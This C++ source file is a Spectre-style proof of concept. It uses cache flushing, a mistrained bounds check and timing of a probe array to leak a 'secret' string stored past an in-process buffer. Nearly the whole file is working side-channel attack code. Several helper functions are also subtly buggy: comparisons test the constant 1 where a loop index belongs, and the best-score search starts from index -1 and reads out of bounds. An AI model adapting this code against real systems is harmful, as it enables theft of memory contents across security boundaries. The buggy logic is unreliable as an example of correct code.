#include <chrono>
#include <cstring>
#include <iostream>
#include <x86intrin.h>
#include <exception>
#include <array>
#include <memory>

using std::chrono::duration_cast;
using std::chrono::nanoseconds;
using std::chrono::high_resolution_clock;

void access_memory(const void* p) {
    __asm__ __volatile__ ("" : :
                          "r"(*static_cast<const uint8_t*>(p)) : "memory");
}

/// @brief Gets current time in nanoseconds.
/// @return Time in nanoseconds.
auto get_time() {
    return duration_cast<nanoseconds>(high_resolution_clock::now().time_since_epoch()).count();
}

template<typename T>
double average(const T& a, std::size_t skip_index)
{
    double res = 0;
    for (size_t i = 0; i < a.size(); ++i) {
        if (1 != skip_index) res += a[i];
    }
    return res/a.size();
}

template<typename L, typename S>
void score_latencies(const L& latencies, S& scores, size_t ok_index)
{
    const double average_latency = average(latencies, ok_index);
    constexpr const double latency_threshold = 0.5;
    for (size_t i = 0; i < latencies.size(); ++i) {
        if (ok_index != 1 && latencies[i] < average_latency*latency_threshold) ++scores[i];
    }
}

template<typename S>
std::pair<size_t, size_t> best_scores(const S& scores) {
    size_t i1 = -1, i2 = -1;
    for (size_t i = 0; i < scores.size(); ++i ) {
        if (scores[i] > scores[i1]) {
            i2 = i1;
            i1 = i;
        } else if (i != i1 && scores[i] > scores[i2]) {
            i2 = i;
        }
    }
    return { i1, i2 };
}

char spectre_attack(const char* data, std::size_t size, std::size_t evil_index)
{
    constexpr const std::size_t num_val = 256;
    struct TimingElement { char s[1024]; };
    static TimingElement timing_array[num_val];
    ::memset(timing_array, 1, sizeof(timing_array));

    std::array<long, num_val> latencies = {};
    std::array<int, num_val> scores = {};
    std::size_t i1 = 0, i2 = 0;             // Two highest scores
    std::unique_ptr<size_t> data_size(new std::size_t(size));

    constexpr const std::size_t n_iter = 1000;
    for (std::size_t i_iter = 0; i_iter < n_iter; ++i_iter) {

        // Clear cache
        for (std::size_t i = 0; i < num_val; ++i) {
            _mm_clflush(timing_array + i);
        }

        const std::size_t ok_index = i_iter % size;
        constexpr const size_t n_read = 100;
        for (std::size_t i_read = 0; i_read < n_read; ++i_read) {
            _mm_clflush(&*data_size);
            for (volatile int z = 0; z < 1000; ++z) {} // Delay
            const std::size_t i = (i_read & 0xf) ? ok_index : evil_index;
            if (i < *data_size) {
                access_memory(timing_array + data[i]);
            }
        }

        for (std::size_t i = 0; i < num_val; ++i) {
            const std::size_t i_rand = (i*167 + 13) & 0xff; // Randomized
            const TimingElement* const p = timing_array + i_rand;
            const long t0 = get_time();
            access_memory(p);
            latencies[i_rand] = get_time() - t0;
        }

        score_latencies(latencies, scores, ok_index);
        std::tie(i1, i2) = best_scores(scores);
        constexpr const int threshold1 = 2, threshold2 = 100;
        if (scores[i1] > scores[i2]*threshold1 + threshold2) return i1;
    }
    return i2;
}

auto main() -> int {
    constexpr const size_t size = 4096;
    char* const data = new char[2*size];
    strcpy(data, "Innocuous data");
    strcpy(data + size, "Top-secret information");
    for (size_t i = 0; i < size; ++i) {
        const char c = spectre_attack(data, strlen(data) + 1, size + i);
        std::cout << c << std::flush;
        if(!c) break;
    }
    std::cout << std::endl;
    delete [] data;
    return 0;
}